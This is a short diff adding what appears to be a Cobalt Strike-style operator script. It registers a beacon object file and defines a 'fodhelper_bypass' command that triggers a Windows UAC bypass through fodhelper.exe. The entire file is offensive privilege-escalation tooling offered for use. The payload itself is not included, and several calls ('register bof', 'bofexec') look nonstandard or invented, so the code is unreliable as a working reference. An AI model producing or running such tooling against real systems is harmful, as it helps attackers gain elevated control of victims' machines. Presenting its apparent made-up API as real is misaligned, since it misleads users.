@@ -1,0 +1,11 @@
+script {
+    register bof "fodhelper_bof" {
+        set description "UAC Bypass via fodhelper.exe"
+    }
+}
+
+command "fodhelper_bypass" {
+    local('$result');
+    $result = bofexec("fodhelper_bof");
+    println("UAC Bypass triggered.");
+}
